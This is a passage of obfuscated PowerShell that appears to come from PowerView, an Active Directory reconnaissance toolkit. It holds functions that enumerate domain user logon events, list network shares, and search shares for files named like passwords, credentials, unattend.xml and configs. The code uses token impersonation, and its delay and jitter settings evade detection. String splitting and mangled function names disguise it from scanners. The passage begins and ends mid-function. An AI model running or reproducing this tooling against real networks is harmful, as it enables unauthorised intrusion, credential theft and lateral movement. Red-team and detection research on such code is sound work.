        [ValidateRange(  0.0, 1.0 )]
        [Double]
        $Jitter  =  .3,

        [Int]
        [ValidateRange(1, 100  )]
        $Threads   = 20
     )

    BEGIN {
        $UserSearcherArguments =  @{
            ("{1}{2}{0}"-f'ies','Prope','rt'  ) =  (  "{0}{2}{1}{3}" -f 'sa','am','maccountn','e' )
        }
        if ( $PSBoundParameters[( "{1}{3}{0}{2}" -f't','Use','y','rIdenti'  )] ) { $UserSearcherArguments[(  "{0}{1}"-f'Ident','ity'  )]   = $UserIdentity }
        if ( $PSBoundParameters[( "{2}{1}{0}" -f'Domain','ser','U'  )]  ) { $UserSearcherArguments[("{0}{1}{2}"-f'Do','ma','in' )]  =  $UserDomain }
        if (  $PSBoundParameters[("{2}{4}{3}{0}{1}" -f 'e','r','UserLD','lt','APFi')]  ) { $UserSearcherArguments[("{3}{1}{2}{0}" -f'lter','DAP','Fi','L' )]   =   $UserLDAPFilter }
        if ( $PSBoundParameters[( "{0}{1}{2}"-f'UserSearc','hBas','e' )]  ) { $UserSearcherArguments[( "{2}{1}{0}"-f 'hBase','rc','Sea')]  =  $UserSearchBase }
        if ($PSBoundParameters[( "{2}{3}{0}{1}" -f'in','Count','UserAd','m')]  ) { $UserSearcherArguments[( "{1}{0}{2}" -f'm','Ad','inCount')]  =  $UserAdminCount }
        if ($PSBoundParameters[( "{0}{2}{1}"-f 'Se','r','rve')]  ) { $UserSearcherArguments[(  "{1}{2}{0}" -f 'er','Ser','v' )] =  $Server }
        if (  $PSBoundParameters[(  "{2}{3}{1}{0}" -f 'ope','archSc','S','e')]  ) { $UserSearcherArguments[(  "{1}{2}{0}"-f 'ope','SearchS','c'  )]   =   $SearchScope }
        if ( $PSBoundParameters[(  "{1}{3}{2}{0}" -f 'ze','ResultPa','i','geS'  )] ) { $UserSearcherArguments[(  "{1}{3}{0}{2}{4}" -f 'geS','Res','i','ultPa','ze')] =  $ResultPageSize }
        if ( $PSBoundParameters[(  "{3}{2}{0}{1}" -f 'mi','t','Li','ServerTime' )] ) { $UserSearcherArguments[( "{1}{4}{2}{0}{3}" -f 'mi','Serv','meLi','t','erTi'  )]  = $ServerTimeLimit }
        if ($PSBoundParameters[("{2}{0}{1}" -f 'o','mbstone','T')]) { $UserSearcherArguments[("{1}{0}{2}" -f'ombst','T','one' )]  =  $Tombstone }
        if (  $PSBoundParameters[(  "{0}{1}{2}"-f 'Cred','entia','l')]) { $UserSearcherArguments[("{1}{0}{2}{3}" -f 'ed','Cr','e','ntial'  )] =   $Credential }

        if ($PSBoundParameters[( "{2}{0}{1}{3}" -f 'Iden','tit','User','y')] -or $PSBoundParameters[(  "{3}{0}{1}{2}" -f'serL','DAPFil','ter','U'  )] -or $PSBoundParameters[( "{4}{3}{2}{1}{0}"-f'e','earchBas','rS','se','U'  )] -or $PSBoundParameters[(  "{0}{1}{2}" -f 'User','Admi','nCount' )] ) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments |  Select-Object -ExpandProperty ( 'sam'+  'account' + 'na'+  'me')
        }
        elseif (  $PSBoundParameters[("{1}{2}{3}{0}" -f'y','UserGr','oupIdenti','t'  )] -or (-not $PSBoundParameters[( "{0}{1}" -f'Fil','ter')]) ) {
            
            $GroupSearcherArguments   =   @{
                ( "{0}{1}{2}"-f 'Id','ent','ity' ) = $UserGroupIdentity
                ("{0}{1}" -f'R','ecurse' ) =  $True
            }
            Write-Verbose (  'UserG'  +  'roup'+  'I' +'dentity: '  +"$UserGroupIdentity"  )
            if (  $PSBoundParameters[(  "{2}{0}{1}" -f 'e','rDomain','Us'  )]  ) { $GroupSearcherArguments[(  "{0}{2}{1}"-f 'Doma','n','i' )] = $UserDomain }
            if (  $PSBoundParameters[(  "{4}{1}{3}{2}{0}" -f 'e','erSearc','as','hB','Us' )]  ) { $GroupSearcherArguments[(  "{2}{0}{1}" -f 'archBa','se','Se')]   =  $UserSearchBase }
            if (  $PSBoundParameters[(  "{1}{0}"-f 'ver','Ser'  )]  ) { $GroupSearcherArguments[("{1}{0}" -f 'ver','Ser'  )] =   $Server }
            if (  $PSBoundParameters[("{0}{1}{2}"-f 'Sear','chSc','ope')] ) { $GroupSearcherArguments[(  "{1}{0}{2}"-f'p','SearchSco','e' )] =  $SearchScope }
            if (  $PSBoundParameters[("{2}{0}{1}{3}"-f 't','PageSi','Resul','ze')]  ) { $GroupSearcherArguments[(  "{1}{2}{0}{4}{3}" -f'lt','Res','u','Size','Page' )] = $ResultPageSize }
            if ( $PSBoundParameters[(  "{1}{3}{0}{2}"-f 'm','Serve','it','rTimeLi'  )]) { $GroupSearcherArguments[( "{2}{3}{1}{0}"-f'eLimit','erTim','Ser','v' )]   =   $ServerTimeLimit }
            if (  $PSBoundParameters[(  "{0}{2}{1}"-f 'To','bstone','m' )]) { $GroupSearcherArguments[(  "{1}{2}{0}"-f 'e','Tombst','on' )]  =   $Tombstone }
            if (  $PSBoundParameters[( "{0}{1}{2}"-f 'Crede','nt','ial')]) { $GroupSearcherArguments[("{2}{1}{0}" -f'tial','den','Cre'  )] =  $Credential }
            $TargetUsers   =   Get-DomainGroupMember @GroupSearcherArguments  |   Select-Object -ExpandProperty ( 'Mem' + 'berN'  + 'ame' )
        }

        
        if ($PSBoundParameters[( "{1}{3}{2}{0}" -f'me','Co','uterNa','mp')]  ) {
            $TargetComputers =  $ComputerName
        }
        else {
            
            $DCSearcherArguments  = @{
                (  "{0}{1}" -f 'LD','AP')  =  $True
            }
            if ($PSBoundParameters[(  "{1}{0}{2}"-f'o','D','main' )]) { $DCSearcherArguments[(  "{1}{0}"-f'ain','Dom')]   = $Domain }
            if ($PSBoundParameters[(  "{0}{2}{1}"-f'S','er','erv' )]  ) { $DCSearcherArguments[(  "{1}{0}"-f 'rver','Se'  )] =  $Server }
            if ( $PSBoundParameters[( "{0}{1}{2}" -f 'Cre','den','tial' )]) { $DCSearcherArguments[( "{1}{0}{2}{3}" -f 'dent','Cre','ia','l'  )] =   $Credential }
            Write-Verbose (  '[Find-Dom'+ 'ainU'  +  's'+'er'+  'Even' +'t] '  + 'Qu'+'e'+  'rying ' +  'f'+  'or ' +  'dom' +'ain ' +  'co'  +  'ntrollers' +' '+  'in' +' '+ 'doma'+ 'in'+': ' +"$Domain")
            $TargetComputers = Get-DomainController @DCSearcherArguments   |   Select-Object -ExpandProperty ( 'dnshostna' +  'm'  +  'e'  )
        }
        if ($TargetComputers -and ($TargetComputers -isnot [System.Array])  ) {
            $TargetComputers = @(,$TargetComputers )
        }
        Write-Verbose "[Find-DomainUserEvent] TargetComputers length: $($TargetComputers.Length) "
        Write-Verbose (  '[Fi'+  'nd-D' +  'omai'+ 'n'  + 'UserEve'+'nt' + '] '  + 'Ta' +  'rgetCom'  +'put'  + 'ers '+"$TargetComputers"  )
        if ( $TargetComputers.LEnGTH -eq 0 ) {
            throw ("{2}{8}{1}{6}{9}{5}{4}{7}{10}{13}{14}{3}{12}{11}{0}"-f 'e','d-Domai','[F','o en','t','ven','nUser',']','in','E',' ','rat','ume','No hosts f','ound t'  )
        }

        
        $HostEnumBlock  =   {
            Param( $ComputerName, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential)

            ForEach ( $TargetComputer in $ComputerName ) {
                $Up   = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if (  $Up ) {
                    $DomainUserEventArgs =  @{
                        ( "{2}{3}{1}{0}"-f 'ame','N','C','omputer' ) =  $TargetComputer
                    }
                    if ( $StartTime) { $DomainUserEventArgs[( "{2}{1}{0}" -f 'ime','T','Start')]  =  $StartTime }
                    if ($EndTime ) { $DomainUserEventArgs[( "{0}{1}"-f 'En','dTime' )]  =   $EndTime }
                    if ($MaxEvents) { $DomainUserEventArgs[( "{2}{1}{0}" -f's','vent','MaxE')] =  $MaxEvents }
                    if ( $Credential ) { $DomainUserEventArgs[( "{2}{0}{1}"-f 't','ial','Creden')]   =   $Credential }
                    if (  $Filter -or $TargetUsers ) {
                        if ( $TargetUsers  ) {
                            Get-DomainUserEvent @DomainUserEventArgs   |   Where-Object {$TargetUsers -contains $_.tArGetUserName}
                        }
                        else {
                            $Operator = 'or'
                            $Filter.KEyS   |   ForEach-Object {
                                if ( (  $_ -eq 'Op') -or ($_ -eq ("{0}{1}{2}" -f 'Op','era','tor'  )) -or (  $_ -eq ("{1}{2}{0}" -f 'on','Oper','ati') )) {
                                    if ( ($Filter[$_] -match '&') -or ($Filter[$_] -eq 'and'  ) ) {
                                        $Operator  = 'and'
                                    }
                                }
                            }
                            $Keys  = $Filter.keyS   | Where-Object {(  $_ -ne 'Op') -and ( $_ -ne (  "{0}{2}{1}"-f'Oper','r','ato')  ) -and ($_ -ne ( "{0}{3}{2}{1}" -f'Op','tion','ra','e'  ) )}
                            Get-DomainUserEvent @DomainUserEventArgs  |   ForEach-Object {
                                if ( $Operator -eq 'or') {
                                    ForEach (  $Key in $Keys  ) {
                                        if ($_."$Key" -match $Filter[$Key]  ) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    
                                    ForEach ( $Key in $Keys  ) {
                                        if (  $_."$Key" -notmatch $Filter[$Key] ) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        Get-DomainUserEvent @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {
        
        if ( $PSBoundParameters[( "{0}{1}" -f'D','elay')] -or $PSBoundParameters[( "{2}{3}{0}{1}" -f 's','s','StopOnSuc','ce')]  ) {

            Write-Verbose "[Find-DomainUserEvent] Total number of hosts: $($TargetComputers.count) "
            Write-Verbose ('[Fi' + 'n'+  'd-D'+  'oma'+  'inUserEvent]' + ' ' + 'De'+  'l' +  'ay: '  +  "$Delay, " +  'Ji' +  'tter'+  ': '+"$Jitter" )
            $Counter = 0
            $RandNo  =  New-Object ( 'System.Ra'  +  'nd'  + 'om' )

            ForEach ($TargetComputer in $TargetComputers ) {
                $Counter  =   $Counter  +   1

                
                Start-Sleep -Seconds $RandNo.NexT(( 1-$Jitter  )*$Delay, ( 1 + $Jitter)*$Delay  )

                Write-Verbose "[Find-DomainUserEvent] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                $Result   =   Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential
                $Result

                if ($Result -and $StopOnSuccess) {
                    Write-Verbose (  "{0}{7}{1}{10}{9}{6}{4}{8}{3}{5}{2}{11}"-f'[Fin','-','turning','t user','UserEven',' found, re','ain','d','t] Targe','om','D',' early'  )
                    return
                }
            }
        }
        else {
            Write-Verbose ( '['+ 'F'  + 'ind-Domai'  +'nUs' +'er' +'Eve'+'nt] ' + 'U' +  'sing' +' '  +'thre' +  'adin'  + 'g '  +'wi' + 'th ' +  't'  + 'hreads: ' +  "$Threads" )

            
            $ScriptParams  =  @{
                ("{2}{0}{1}"-f 'rtT','ime','Sta')  =  $StartTime
                (  "{2}{1}{0}"-f 'me','Ti','End'  ) = $EndTime
                ( "{2}{0}{1}" -f'xEv','ents','Ma'  ) = $MaxEvents
                ("{2}{0}{1}" -f 'tUse','rs','Targe' )   = $TargetUsers
                ("{0}{2}{1}" -f'Fil','r','te' )  =   $Filter
                ( "{2}{1}{0}" -f 'tial','n','Crede'  )   =   $Credential
            }

            
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function FInD-D`Om`Ainshare {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{1}{2}{3}{0}"-f'ss','PSSh','oul','dProce'}, '')]
    [OutputType( {"{1}{0}{3}{6}{5}{4}{2}" -f'owerView','P','fo','.','In','are','Sh'})]
    Param(  
        [Parameter( POsItION  = 0, vaLuEFrOmPiPeliNe   =   $True, vAlUEFrOmPiPeLINeBypROPERtYNAME  =   $True)]
        [Alias(  {"{0}{3}{1}{2}" -f 'DNSH','a','me','ostN'})]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty( )]
        [Alias(  {"{0}{1}" -f 'Dom','ain'})]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty(    )]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{4}{3}{1}{2}"-f'O','ing','System','rat','pe'}  )]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty(  )]
        [Alias(  {"{2}{0}{3}{1}" -f 'ic','ck','Serv','ePa'})]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty(  )]
        [Alias({"{2}{0}{1}"-f'eNam','e','Sit'} )]
        [String]
        $ComputerSiteName,

        [Alias( {"{1}{0}{2}{3}" -f 'ckAc','Che','ce','ss'} )]
        [Switch]
        $CheckShareAccess,

        [ValidateNotNullOrEmpty( )]
        [Alias({"{1}{0}{2}" -f 'tro','DomainCon','ller'} )]
        [String]
        $Server,

        [ValidateSet(  {"{0}{1}"-f 'B','ase'}, {"{2}{0}{1}" -f'neL','evel','O'}, {"{1}{0}"-f'btree','Su'}  )]
        [String]
        $SearchScope =   ("{2}{0}{1}" -f 're','e','Subt'  ),

        [ValidateRange(  1, 10000  )]
        [Int]
        $ResultPageSize   =   200,

        [ValidateRange( 1, 10000 )]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential  =   [Management.Automation.PSCredential]::emptY,

        [ValidateRange( 1, 10000  )]
        [Int]
        $Delay   =   0,

        [ValidateRange( 0.0, 1.0 )]
        [Double]
        $Jitter   =   .3,

        [Int]
        [ValidateRange( 1, 100 )]
        $Threads   =   20
     )

    BEGIN {

        $ComputerSearcherArguments   = @{
            ("{2}{0}{1}{3}" -f 'pe','rti','Pro','es')  =  (  "{2}{0}{1}{3}" -f'host','na','dns','me'  )
        }
        if ($PSBoundParameters[(  "{1}{2}{0}"-f 'in','Compute','rDoma'  )]) { $ComputerSearcherArguments[("{0}{1}"-f 'Do','main' )]   =   $ComputerDomain }
        if ( $PSBoundParameters[( "{5}{0}{1}{4}{2}{3}" -f 'omp','uter','APFi','lter','LD','C'  )]  ) { $ComputerSearcherArguments[( "{2}{0}{1}"-f'F','ilter','LDAP')]   =  $ComputerLDAPFilter }
        if ($PSBoundParameters[("{3}{1}{0}{5}{2}{4}"-f'terSear','pu','as','Com','e','chB'  )] ) { $ComputerSearcherArguments[( "{0}{2}{3}{1}" -f'S','e','ea','rchBas'  )]   = $ComputerSearchBase }
        if (  $PSBoundParameters[(  "{2}{1}{0}{3}"-f'ns','nco','U','trained'  )]) { $ComputerSearcherArguments[(  "{3}{1}{0}{2}"-f 'r','onst','ained','Unc')]   = $Unconstrained }
        if (  $PSBoundParameters[( "{5}{4}{0}{6}{3}{2}{1}" -f'u','tem','Sys','perating','omp','C','terO' )]  ) { $ComputerSearcherArguments[("{1}{2}{3}{4}{0}"-f 'm','Ope','r','atin','gSyste'  )]   =  $OperatingSystem }
        if ($PSBoundParameters[(  "{4}{3}{2}{5}{1}{0}" -f 'ack','iceP','r','mputerSe','Co','v')] ) { $ComputerSearcherArguments[(  "{1}{2}{0}"-f'ck','Ser','vicePa')]   =   $ServicePack }
        if ($PSBoundParameters[("{4}{2}{1}{3}{0}" -f 'me','S','uter','iteNa','Comp' )] ) { $ComputerSearcherArguments[( "{1}{2}{0}"-f'e','SiteNa','m'  )]   =   $SiteName }
        if ($PSBoundParameters[( "{0}{1}{2}" -f 'Ser','ve','r' )]) { $ComputerSearcherArguments[(  "{0}{2}{1}" -f'Ser','r','ve')]  =   $Server }
        if (  $PSBoundParameters[("{2}{1}{0}" -f'pe','chSco','Sear' )] ) { $ComputerSearcherArguments[("{0}{1}{2}" -f 'S','earchS','cope'  )] = $SearchScope }
        if ( $PSBoundParameters[( "{0}{3}{4}{1}{2}" -f'Result','eSiz','e','Pa','g')]) { $ComputerSearcherArguments[( "{1}{2}{3}{0}"-f 'eSize','Resu','lt','Pag'  )] =  $ResultPageSize }
        if ($PSBoundParameters[(  "{2}{1}{0}"-f'it','imeLim','ServerT' )]  ) { $ComputerSearcherArguments[( "{1}{2}{0}"-f'mit','Ser','verTimeLi'  )]   =  $ServerTimeLimit }
        if (  $PSBoundParameters[( "{2}{1}{0}" -f 'e','mbston','To' )]  ) { $ComputerSearcherArguments[( "{1}{2}{0}"-f'e','T','ombston')]  =  $Tombstone }
        if ($PSBoundParameters[(  "{0}{1}{2}{3}" -f 'Cred','e','ntia','l'  )]  ) { $ComputerSearcherArguments[(  "{2}{1}{0}{3}" -f 'a','i','Credent','l' )]   =  $Credential }

        if (  $PSBoundParameters[(  "{1}{2}{0}" -f'me','Com','puterNa'  )]  ) {
            $TargetComputers  =   $ComputerName
        }
        else {
            Write-Verbose ( "{5}{1}{9}{8}{3}{4}{2}{0}{7}{6}" -f 't','Domai','ompu','uerying',' c','[Find-',' domain','ers in the',' Q','nShare]' )
            $TargetComputers  = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty ( 'dn'+'shost'+  'na'+  'me' )
        }
        Write-Verbose "[Find-DomainShare] TargetComputers length: $($TargetComputers.Length) "
        if (  $TargetComputers.leNGth -eq 0  ) {
            throw (  "{3}{4}{0}{7}{8}{1}{9}{12}{11}{6}{2}{13}{5}{10}"-f 'Domain','No ','to e','[Find','-','m',' ','Sha','re] ','h','erate','nd','osts fou','nu'  )
        }

        
        $HostEnumBlock  = {
            Param($ComputerName, $CheckShareAccess, $TokenHandle )

            if ( $TokenHandle) {
                
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName  ) {
                $Up  =  Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if (  $Up  ) {
                    
                    $Shares = Get-NetShare -ComputerName $TargetComputer
                    ForEach (  $Share in $Shares  ) {
                        $ShareName  =  $Share.name
                        
                        $Path   = '\\'+ $TargetComputer  +  '\'+$ShareName

                        if ( ( $ShareName ) -and (  $ShareName.tRIm(   ) -ne ''  )) {
                            
                            if ($CheckShareAccess  ) {
                                
                                try {
                                    $Null = [IO.Directory]::gETfiLEs( $Path)
                                    $Share
                                }
                                catch {
                                    Write-Verbose ( 'E'  + 'rror '+ 'a'+ 'ccess'  + 'ing '+  's'+'hare ' + 'pat' + 'h '  +  "$Path "  +': '  + "$_"  )
                                }
                            }
                            else {
                                $Share
                            }
                        }
                    }
                }
            }

            if ( $TokenHandle ) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if (  $PSBoundParameters[(  "{0}{1}{2}"-f 'Cr','ed','ential'  )] ) {
            if ( $PSBoundParameters[( "{0}{1}"-f'Dela','y'  )] -or $PSBoundParameters[("{0}{2}{3}{1}"-f 'Sto','ccess','pOnS','u' )] ) {
                $LogonToken =  Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken   = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        
        if (  $PSBoundParameters[(  "{1}{0}"-f'y','Dela' )] -or $PSBoundParameters[( "{3}{0}{1}{2}{4}" -f 'p','OnSu','cces','Sto','s'  )] ) {

            Write-Verbose "[Find-DomainShare] Total number of hosts: $($TargetComputers.count) "
            Write-Verbose ( '[Find-D' +'om' + 'ainShare]'  +  ' '+'D'  +  'elay: '  + "$Delay, "+ 'Jit'+ 'te'+ 'r: ' + "$Jitter" )
            $Counter   = 0
            $RandNo   =   New-Object ('System' + '.' +  'Random' )

            ForEach ($TargetComputer in $TargetComputers  ) {
                $Counter   =  $Counter +   1

                
                Start-Sleep -Seconds $RandNo.nEXt( (1-$Jitter  )*$Delay, (1 + $Jitter  )*$Delay)

                Write-Verbose "[Find-DomainShare] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $CheckShareAccess, $LogonToken
            }
        }
        else {
            Write-Verbose ( '[Find-Dom' +  'ainSha'  +'r'  +'e] '+  'Us'+  'ing '+ 'th' +'rea'  +  'd'+ 'ing '  +'w' +'ith '  + 'th' +'r'  + 'eads: '  +"$Threads"  )

            
            $ScriptParams   =  @{
                (  "{1}{2}{0}{3}{4}" -f'r','Ch','eckSha','e','Access'  )   = $CheckShareAccess
                ( "{1}{2}{0}" -f 'ndle','To','kenHa')   =  $LogonToken
            }

            
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function f`InD-INtE`ResT`iNGd`OmAiNshAr`efiLe {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{0}{1}{2}{3}"-f'oul','dP','roces','s','PSSh'}, ''  )]
    [OutputType({"{4}{2}{3}{0}{1}" -f 'u','ndFile','owerVi','ew.Fo','P'} )]
    [CmdletBinding(dEfaUltparaMeTErsetNaMe =   {"{1}{3}{2}{0}"-f 'pecification','F','leS','i'}  )]
    Param(
        [Parameter(POsiTION   =  0, ValUEfrOMpIPeLIne = $True, ValUEFroMPIpelINEbYpROPeRTynAME  = $True )]
        [Alias( {"{0}{2}{1}" -f 'DNSHostN','me','a'})]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty( )]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty(   )]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty(   )]
        [Alias(  {"{3}{1}{2}{4}{0}" -f 'ystem','erati','n','Op','gS'} )]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias(  {"{2}{1}{0}"-f'ePack','vic','Ser'}  )]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty(   )]
        [Alias(  {"{1}{0}{2}" -f 't','Si','eName'} )]
        [String]
        $ComputerSiteName,

        [Parameter(PaRAmETERSetnamE =   "fi`LeS`PEcifICatI`oN")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f'rms','Te','Search'}, {"{0}{1}" -f 'T','erms'})]
        [String[]]
        $Include = @((  "{1}{2}{0}" -f'sword*','*','pas'  ), ("{0}{2}{1}"-f '*se','ve*','nsiti'  ), ("{1}{0}" -f'dmin*','*a' ), ( "{0}{2}{1}"-f '*','gin*','lo' ), ("{0}{1}{2}" -f'*se','cre','t*' ), ( "{0}{1}{3}{2}" -f 'u','natten','l','d*.xm'  ), (  "{1}{0}" -f'dk','*.vm'), (  "{0}{1}" -f'*c','reds*'  ), ( "{2}{0}{1}{3}" -f'cr','edent','*','ial*'  ), (  "{1}{2}{0}" -f 'fig','*.','con' ) ),

        [ValidateNotNullOrEmpty(  )]
        [ValidatePattern( {((  "{3}{2}{0}{1}" -f'0}','{0}{0}','{','{0}'  )  )-f [ChAr]92}  )]
        [Alias( {"{0}{1}" -f 'Sha','re'} )]
        [String[]]
        $SharePath,

        [String[]]
        $ExcludedShares  =   @('C$', ( (  'Admin'+ 'u3x'  ).rePLACe(  'u3x',[String][ChaR]36 )), ( ( 'Pri'+  'n'+'twgT'  ).REplacE( (  [cHar]119  +[cHar]103+  [cHar]84  ),[STRInG][cHar]36  )), (  ( (  'IP'  +  'CXlE' ) -replacE'XlE',[chaR]36 ) )  ),

        [Parameter( pArAmetErsEtnAME =   "fILEs`PEciF`IC`Ation")]
        [ValidateNotNullOrEmpty( )]
        [DateTime]
        $LastAccessTime,

        [Parameter(  PArAMEteRsEtNamE =   "FiLes`p`e`CI`Fi`CatION" )]
        [ValidateNotNullOrEmpty( )]
        [DateTime]
        $LastWriteTime,

        [Parameter(ParameTersetNamE  =   "filEsPe`CIfI`ca`Tion"  )]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,

        [Parameter(  pARAMETErSeTNaME = "O`F`FiCEDoCS"  )]
        [Switch]
        $OfficeDocs,

        [Parameter( PARAmETeRSEtnAmE  =  "FREsH`eX`es"  )]
        [Switch]
        $FreshEXEs,

        [ValidateNotNullOrEmpty( )]
        [Alias({"{2}{0}{1}{3}"-f 'nC','ont','Domai','roller'} )]
        [String]
        $Server,

        [ValidateSet( {"{0}{1}" -f'B','ase'}, {"{1}{0}" -f 'neLevel','O'}, {"{2}{1}{0}"-f'ee','r','Subt'})]
        [String]
        $SearchScope   = ("{0}{2}{1}" -f'Subt','e','re' ),

        [ValidateRange(  1, 10000 )]
        [Int]
        $ResultPageSize =   200,

        [ValidateRange(  1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential   =  [Management.Automation.PSCredential]::eMPTy,

        [ValidateRange(  1, 10000 )]
        [Int]
        $Delay   =  0,

        [ValidateRange(  0.0, 1.0  )]
        [Double]
        $Jitter =   .3,

        [Int]
        [ValidateRange( 1, 100 )]
        $Threads = 20
     )

    BEGIN {
        $ComputerSearcherArguments =  @{
            ("{3}{1}{0}{2}" -f 'ie','ert','s','Prop' ) =   (  "{2}{1}{3}{0}" -f 'me','sh','dn','ostna'  )
        }
        if ( $PSBoundParameters[(  "{0}{1}{2}"-f 'Comput','erD','omain' )]) { $ComputerSearcherArguments[( "{0}{1}"-f 'Do','main' )] =  $ComputerDomain }
        if ( $PSBoundParameters[("{0}{4}{2}{3}{1}"-f'Compu','PFilter','erL','DA','t' )]  ) { $ComputerSearcherArguments[("{1}{0}{2}{3}" -f'DAPFi','L','lte','r')]   = $ComputerLDAPFilter }
        if ( $PSBoundParameters[(  "{1}{2}{0}{4}{5}{3}" -f'terS','Comp','u','e','earc','hBas')] ) { $ComputerSearcherArguments[( "{2}{0}{1}" -f'arc','hBase','Se' )]  =  $ComputerSearchBase }
        if ($PSBoundParameters[("{4}{3}{6}{0}{5}{1}{2}" -f 'per','ys','tem','er','Comput','atingS','O' )]  ) { $ComputerSearcherArguments[( "{2}{3}{0}{1}"-f 't','ingSystem','Oper','a'  )]  =  $OperatingSystem }
        if ( $PSBoundParameters[("{4}{2}{3}{0}{5}{1}" -f 'rvice','ack','ompute','rSe','C','P' )]  ) { $ComputerSearcherArguments[("{3}{1}{2}{0}"-f 'k','ceP','ac','Servi'  )]   = $ServicePack }
        if ($PSBoundParameters[("{1}{0}{2}" -f 'm','ComputerSiteNa','e' )] ) { $ComputerSearcherArguments[("{1}{2}{0}"-f'me','S','iteNa')]  =  $SiteName }
        if ( $PSBoundParameters[("{1}{0}"-f'rver','Se'  )]) { $ComputerSearcherArguments[( "{0}{1}" -f 'S','erver' )] =  $Server }
        if ($PSBoundParameters[("{2}{0}{1}{3}"-f'arch','Sc','Se','ope' )] ) { $ComputerSearcherArguments[("{3}{0}{2}{1}" -f'e','ope','archSc','S'  )]   = $SearchScope }
        if ( $PSBoundParameters[("{3}{0}{2}{1}"-f 'ltPage','e','Siz','Resu' )]  ) { $ComputerSearcherArguments[("{2}{1}{0}"-f 'e','ageSiz','ResultP')] =   $ResultPageSize }
        if (  $PSBoundParameters[(  "{2}{3}{1}{0}"-f 'imit','L','S','erverTime')] ) { $ComputerSearcherArguments[(  "{0}{4}{2}{1}{3}"-f 'S','erTim','rv','eLimit','e' )]  =   $ServerTimeLimit }
        if ($PSBoundParameters[( "{1}{2}{0}"-f'ne','Tom','bsto')] ) { $ComputerSearcherArguments[("{1}{0}{2}" -f 's','Tomb','tone' )]   =  $Tombstone }
        if ($PSBoundParameters[("{2}{3}{1}{0}" -f 'tial','n','Cre','de')]) { $ComputerSearcherArguments[("{0}{2}{1}"-f 'C','l','redentia')] = $Credential }

        if ($PSBoundParameters[(  "{1}{0}{3}{2}" -f'ompu','C','me','terNa' )] ) {
            $TargetComputers   = $ComputerName
        }
        else {
            Write-Verbose ( "{4}{3}{7}{8}{9}{5}{12}{1}{13}{10}{2}{6}{0}{11}" -f 'dom','eFile] Q','rs i','in','[F','n','n the ','d-Interes','ti','ngDomai','mpute','ain','Shar','uerying co' )
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments  | Select-Object -ExpandProperty ('dns' + 'hostn'  +  'a' +'me')
        }
        Write-Verbose "[Find-InterestingDomainShareFile] TargetComputers length: $($TargetComputers.Length) "
        if ( $TargetComputers.lenGth -eq 0  ) {
            throw (  "{0}{5}{4}{8}{1}{2}{7}{6}{3}{9}"-f'[Fi','eFil','e] No h','o','-Inter','nd','d t','osts foun','estingDomainShar',' enumerate' )
        }

        
        $HostEnumBlock   = {
            Param( $ComputerName, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $TokenHandle)

            if (  $TokenHandle) {
                
                $Null   = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName ) {

                $SearchShares =   @()
                if ($TargetComputer.stArTsWITh(  '\\'  )) {
                    
                    $SearchShares += $TargetComputer
                }
                else {
                    $Up   =   Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                    if ( $Up ) {
                        
                        $Shares =  Get-NetShare -ComputerName $TargetComputer
                        ForEach (  $Share in $Shares) {
                            $ShareName   =  $Share.NaME
                            $Path = '\\'+  $TargetComputer +  '\'+  $ShareName
                            
                            if ( ( $ShareName ) -and (  $ShareName.TRIM(  ) -ne ''  ) ) {
                                
                                if ( $ExcludedShares -NotContains $ShareName) {
                                    
                                    try {
